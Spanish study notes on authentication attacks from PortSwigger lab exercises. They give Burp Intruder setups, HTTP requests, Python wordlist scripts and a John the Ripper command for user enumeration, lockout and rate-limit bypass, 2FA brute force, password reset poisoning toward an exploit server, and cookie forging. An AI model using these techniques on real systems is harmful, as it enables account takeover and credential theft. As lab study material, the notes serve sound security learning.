
---
Tags: #Authentication #BugBounty #burpsuite #clusterbomb #headers

---
# Índice

- [[#1. Introducción y Conceptos Clave]]
	
- [[#2. Técnicas de Enumeración de Usuarios]]
	- [[#2.1. Enumeración por Respuestas Verbosas]]
	- [[#2.2. Enumeración por Diferencias Sutiles (Grep Extraction)]]
	- [[#2.3. Enumeración por Tiempo de Respuesta (Timing Attacks)]]
	- [[#2.4. Enumeración por Bloqueo de Cuenta]]
	
- [[#3. Ataques de Fuerza Bruta y Evasión de Protecciones]]
	- [[#3.1. Bypass de Bloqueo por IP (Reset de Contador)]]
	- [[#3.2. Protección Rota Múltiples Credenciales por Petición (JSON Batching)]]
	- [[#3.3. Fuerza Bruta en Cambio de Clave (Account Takeover Lateral)]]
	
- [[#4. Lógica de Negocio Rota (Business Logic Flaws)]]
	- [[#4.1. Bypass Básico de 2FA (Forced Browsing)]]
	- [[#4.2. Lógica Rota en Reseteo de Contraseña (Parameter Tampering)]]
	- [[#4.3. Lógica Rota en Flujo 2FA (Usuario Variable)]]
	- [[#4.4. Bypass de 2FA con Macros (Automatización de Sesión)]]
	
- [[#5. Técnicas Avanzadas y Exóticas]]
	- [[#5.1. Password Reset Poisoning (Middleware / Host Header Injection)]]
	- [[#5.2. Ingeniería Inversa de Cookies (Stay-Logged-In)]]
	- [[#5.3. Cracking Offline]]
	
- [[#📁 Resumen de Herramientas y Configuraciones]]
---
## 1. Introducción y Conceptos Clave

La gestión de autenticación verifica la identidad de un usuario. Las vulnerabilidades aquí permiten a un atacante obtener acceso a funciones o datos sensibles. Los ataques se dividen generalmente en:

- **Enumeración:** Identificar qué usuarios existen.
    
- **Fuerza Bruta / Cracking:** Adivinar credenciales.
    
- **Bypass de Lógica:** Saltarse controles (como 2FA o reseteos).
    

---
## 2. Técnicas de Enumeración de Usuarios

El primer paso en un ataque dirigido es saber _a quién_ atacar. Los desarrolladores a menudo revelan demasiada información en los mensajes de error.

### 2.1. Enumeración por Respuestas Verbosas

**Concepto:** La aplicación indica explícitamente si el fallo fue el usuario o la contraseña.

**Detección:** Introducir un usuario que sabes que no existe (ej: `sdfsdfsdf`) y observar la respuesta `Invalid username`. Luego probar con uno que sí existe (si lo conoces) o fuerza bruta.

**Configuración del Ataque (Burp Intruder):**

- **Attack Type:** Sniper.
    
- **Payload:** Lista de usuarios comunes.
    
- **Grep - Match:** Configura en la pestaña _Options_ una regla para buscar la cadena "Invalid username".
    
- **Objetivo:** Filtrar los resultados que **NO** contengan esa cadena (o que tengan una longitud diferente).
    

```HTTP
POST /login HTTP/2
Host: target.web-security-academy.net
...
username=§admin§&password=password123
```

> **Nota:** Una vez tienes el usuario, repites el proceso fijando el usuario y variando la contraseña.

### 2.2. Enumeración por Diferencias Sutiles (Grep Extraction)

**Concepto:** La aplicación intenta ser segura devolviendo un mensaje genérico ("Usuario o contraseña incorrectos"), pero comete un error tipográfico o de formato sutil cuando el usuario _sí_ existe.

**Ejemplo:**

- Usuario inexistente: `Invalid username or password.` (con punto).
    
- Usuario existente: `Invalid username or password` (sin punto, o quizás con un espacio extra).
    

**Técnica:**

En Burp Intruder, usa la opción **Grep - Extract** para extraer el mensaje de error completo en una columna separada y ordénalos. Cualquier desviación visual o de longitud (Length) es un indicador de usuario válido.

### 2.3. Enumeración por Tiempo de Respuesta (Timing Attacks)

**Concepto:** Algunas bases de datos o funciones de hash (como bcrypt) tardan más en procesar si el usuario existe que si no. O, si la aplicación verifica el password _solo_ si encuentra el usuario, una contraseña extremadamente larga causará un retraso medible (Denial of Service local en la CPU del server para ese hilo).

**Vector de Ataque:**

Sobrecargar el campo de contraseña para maximizar el tiempo de procesamiento de hash si el usuario es válido.

```HTTP
POST /login HTTP/2
X-Forwarded-For: 127.0.0.§1§  <-- Bypass de bloqueo por IP básico
...
username=§usuario§&password=AAAAAAAAAAAAAA...
```

**Configuración Intruder:**

- **Columns:** Activa la columna "Response Completed" o "Time".
    
- **Análisis:** Busca picos de tiempo significativos (ej: 2000ms vs 100ms).
    
- **Tip Pro:** Usa `X-Forwarded-For` con un payload numérico (Pitchfork) si hay un WAF/Rate Limit básico que bloquea por IP.
    

### 2.4. Enumeración por Bloqueo de Cuenta

**Concepto:** Si la política es "bloquear cuenta tras 5 intentos fallidos", puedes abusar de esto para enumerar.

**Lógica:**

1. Lanzas 5 intentos fallidos contra una lista de usuarios.
    
2. Los usuarios inexistentes siempre darán "Invalid user/pass".
    
3. El usuario **existente** dará un mensaje de "Account locked" en el intento 6.
    

**Configuración Intruder:**

- **Attack Type:** Cluster Bomb (Usuario + Password) para probar asi multimples contraseñas por cada usuario.
    
- **Estrategia:** Probar una lista corta de passwords repetitivas contra una lista de usuarios para disparar el _lockout_.
    

Ejemplo:

```http
POST /login HTTP/2
Host: 0a5b00dc03f1d56b81cc8991006200ca.web-security-academy.net
Cookie: session=hI0WBxCja1ebOIUNN56ORRJgKO7DE32X

username=[Payload]&password=[Payload]
```

---
## 3. Ataques de Fuerza Bruta y Evasión de Protecciones

Una vez tenemos el usuario, o si queremos atacar ambos campos, necesitamos evadir las protecciones.

### 3.1. Bypass de Bloqueo por IP (Reset de Contador)

**Concepto:** El contador de intentos fallidos a veces se resetea tras un inicio de sesión exitoso. Si tienes una cuenta válida (atacante), puedes intercalarla para resetear el contador de la IP.

**Lógica del Script:**

Ciclo infinito: 2 intentos a la víctima -> 1 intento a tu cuenta -> Repetir.

**Scripting (Python):**

El script que presentas genera un diccionario "intercalado".

1. Genera lista: `carlos`, `carlos`, `wiener` (tu usuario).
	
```python
#!/usr/bin/python3

for i in range(0,200):
    if i % 3 == 0:
        print('wiener')
    else:
        print('carlos')
```
    
2. Genera passwords: `pass1`, `pass2`, `pass3`, `tu_password`.
    
```python
#!/usr/bin/python3

ruta = '/home/lboom/Desktop/laboratorios/portswigger/gestion_de_autenticacion/pass.txt'

with open(ruta) as f:
    lines = f.readlines()

# Usamos un contador externo para las contraseñas
pwd_index = 0

# El bucle se ejecuta mientras nos queden contraseñas por procesar
# i representará el número de línea en nuestro NUEVO archivo
for i in range(200): # Un rango amplio, saldremos con el break
    if pwd_index >= len(lines):
        break
        
    if i % 3 == 0:
        # Cada 4 líneas del nuevo archivo, inyectamos a peter
        print('peter')
    else:
        # En las otras 3 posiciones, ponemos la contraseña y avanzamos el puntero
        print(lines[pwd_index].strip())
        pwd_index += 1
```
	
**Configuración Intruder:**

- **Attack Type:** Pitchfork (necesitas sincronizar usuario y contraseña línea por línea).
    
- **Resource Pool:** **CRÍTICO**. Debes poner `Maximum concurrent requests: 1`. Si envías peticiones paralelas, el orden se rompe y te bloquearán.
    

### 3.2. Protección Rota: Múltiples Credenciales por Petición (JSON Batching)

**Concepto:** La aplicación acepta una matriz (array) JSON en el campo password.

**Vulnerabilidad:** Validar una contraseña cuesta "1 intento" de cara al rate-limit, pero si envías 100 en un array, el backend podría procesarlas todas en una sola petición HTTP.

Aquí el comando para darter un formato de JSON:

```bash
cat pass.txt | while read line; do echo "\"$line\","; done
```

**Vector:**

```JSON
{
    "username":"carlos",
    "password":[
        "123456",
        "password",
        "qwerty",
        ... (hasta el límite que soporte el parser JSON)
    ]
}
```

**Tip:** Usa `jq` o un script de bash simple para convertir tu wordlist a formato JSON array.

### 3.3. Fuerza Bruta en Cambio de Clave (Account Takeover Lateral)

**Escenario:** Tienes acceso a una cuenta (o has robado una sesión) y quieres cambiar la contraseña, pero te pide la "Current Password".

**Técnica:** Usar fuerza bruta sobre el campo `current-password` mientras mantienes tu sesión válida.

**Detección:** Busca la desaparición del mensaje "Current password is incorrect".

---

## 4. Lógica de Negocio Rota (Business Logic Flaws)

Errores en el flujo de la aplicación, no necesariamente en el código criptográfico.

### 4.1. Bypass Básico de 2FA (Forced Browsing)

**Concepto:** La aplicación te autentica (setea la cookie de sesión) _antes_ de pedirte el 2FA. La página del 2FA es solo una "capa visual".

**Ataque:**

1. Ingresa credenciales correctas.
    
2. Te lleva a `/login2` o `/mfa`.
    
3. Manualmente cambia la URL a `/my-account` o `/home`.
    
4. Si carga, el 2FA no valida la sesión en el backend.
    

### 4.2. Lógica Rota en Reseteo de Contraseña (Parameter Tampering)

**Concepto:** El token de reseteo valida que "alguien" pidió restaurar contraseña, pero la aplicación confía ciegamente en un parámetro `username` enviado en el cuerpo de la petición.

**Ataque:**

1. Pide reseteo para tu cuenta.
    
2. Recibe token válido.
    
3. Intercepta la petición de cambio de clave.
    
4. Cambia `username=atacante` a `username=victima`.
    
5. Mantén tu token válido.

```http
POST /forgot-password?temp-forgot-password-token=0mw565glyqs14u4p6qraty3ak0yw7g97 HTTP/2
Host: 0a02007e04fcda2c8132b127006d00b3.web-security-academy.net
Cookie: session=y6jDWqXp4tyCbudGcPbV8hK4r4bqtrTk
Content-Length: 115
Origin: https://0a02007e04fcda2c8132b127006d00b3.web-security-academy.net
Referer: https://0a02007e04fcda2c8132b127006d00b3.web-security-academy.net/forgot-password?temp-forgot-password-token=0mw565glyqs14u4p6qraty3ak0yw7g97

temp-forgot-password-token=0mw565glyqs14u4p6qraty3ak0yw7g97&username=carlos&new-password-1=1234&new-password-2=1234
```

### 4.3. Lógica Rota en Flujo 2FA (Usuario Variable)

**Concepto:** Similar al reseteo, pero en el login.

**Flujo Vulnerable:**

1. `GET /login2` (Verifica código MFA).
    
2. La cookie `verify=carlos` controla a quién se valida.
    
3. Si puedes generar un código para el usuario, o si el código es simple (4 dígitos), puedes atacar.
    
	Generar código para la victima:

```http
GET /login2 HTTP/2
Host: 0a6a007c034a338d80d60d8600fa00d8.web-security-academy.net
Cookie: session=6yqh85J3G7CfNEYkhkvQBCiPsifb8bDo; verify=carlos

```


**Ataque de Fuerza Bruta al MFA:**

Intercepta la petición del código y lanza un Intruder (0000-9999).

_Nota:_ Si hay rate limit en el código, intenta ver si puedes manipular la cookie de sesión o el parámetro de usuario para saltar comprobaciones.

```http
POST /login2 HTTP/2
Host: 0a6a007c034a338d80d60d8600fa00d8.web-security-academy.net
Cookie: session=6yqh85J3G7CfNEYkhkvQBCiPsifb8bDo; verify=carlos

mfa-code=[Payload numerico con formato 0000 a 9999 en este caso]

```

### 4.4. Bypass de 2FA con Macros (Automatización de Sesión)

**Problema:** Al intentar fuerza bruta al código 2FA, la página de login expira o el token CSRF cambia en cada intento, invalidando el ataque de Intruder simple.

**Solución: Macros de Burp Suite.**

Una **Macro** es una secuencia de peticiones que Burp realiza automáticamente _antes_ de tu payload de ataque.

**Pasos:**

1. **Project Options > Sessions > Macros > Add.**
    
2. Graba la secuencia: `GET Login` -> `POST Login (creds válidas)` -> `GET 2FA page`.
    
3. **Session Handling Rules:** Crea una regla que ejecute esta macro.
    
4. Define el alcance (Scope) para que aplique al Intruder.
    
5. **Resultado:** Burp se loguea, obtiene cookies frescas y tokens CSRF válidos _para cada intento_ del código 2FA (0000-9999).
    

---

## 5. Técnicas Avanzadas y Exóticas

### 5.1. Password Reset Poisoning (Middleware / Host Header Injection)

**Concepto:** La aplicación construye el enlace de "Olvide su contraseña" usando el encabezado `Host` o `X-Forwarded-Host` de la petición entrante.

**Ataque:**

1. Intercepta la petición `POST /forgot-password`.
    
2. Añade/Modifica: `X-Forwarded-Host: mi-servidor-malicioso.com`.
	
```http
POST /forgot-password HTTP/2
Host: 0a1c00f704426511802f216f00ec00e4.web-security-academy.net
Cookie: session=VRjyMlbR5nWpS67Maf4cJNCewOXFjkfw
X-Forwarded-Host: exploit-0a1c00ad04ea65728041202b0149008f.exploit-server.net
Content-Length: 15

username=carlos
```
    
3. El servidor genera el email: `Haga clic aquí: https://mi-servidor-malicioso.com/reset?token=12345`.
    
4. La víctima recibe el email, hace clic, y su navegador envía el token a TU servidor.
    
5. Revisas tus logs de acceso y capturas el token.
    

### 5.2. Ingeniería Inversa de Cookies (Stay-Logged-In)

**Escenario:** Cookies opacas que mantienen la sesión.

**Caso de Estudio:** Cookie `stay-logged-in`.

**Análisis:**

1. Valor: `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` (Parece Base64).
    
2. Decodificado: `wiener:51dc30ddc473d43a6011e9ebba6ca770` (Usuario + separador + hash).
    
3. El hash parece MD5. Al hashear la contraseña de wiener ("peter") -> coincide.
    
4. **Conclusión:** La estructura es `Base64(username:MD5(password))`.
    

**Explotación (Intruder Payload Processing):**

Para suplantar a Carlos, necesitamos su contraseña. Usamos fuerza bruta pero procesando el payload para que coincida con el formato de la cookie.

1. Payload: Lista de contraseñas.
    
2. **Processing Rule 1:** Hash: MD5.
    
3. **Processing Rule 2:** Add Prefix: `carlos:`.
    
4. **Processing Rule 3:** Encode: Base64.
    
5. Esto probará cookies válidas automáticamente.
    

### 5.3. Cracking Offline

**Concepto:** Si robas un hash (vía XSS accediendo a `document.cookie` o SQL Injection), no necesitas interactuar más con la web.

**Herramienta:** John the Ripper o Hashcat.

```Bash
# Formato para John (MD5 raw)
john --format=Raw-MD5 --wordlist=rockyou.txt hash_carlos.txt
```

> **[!TIP] Importante:** Siempre verifica el formato del hash (longitud, caracteres) para elegir el modo correcto en John o Hashcat.

---

## 📁 Resumen de Herramientas y Configuraciones

|**Técnica**|**Herramienta Clave**|**Configuración Vital**|
|---|---|---|
|Enumeración (Error)|Intruder (Sniper)|Grep - Match (String de error)|
|Enumeración (Tiempo)|Intruder (Pitchfork)|Columna "Response Time"|
|IP Block Bypass|Python Script + Intruder|**Resource Pool: 1 concurrent request**|
|2FA Brute Force|Intruder + Macros|Session Handling Rules (Update CSRF/Cookie)|
|Batch Attack|Repeater / Python|Formato JSON Array `["p1", "p2"...]`|
|Cookie Forging|Intruder Payloads|Payload Processing (Hash -> Prefix -> Encode)|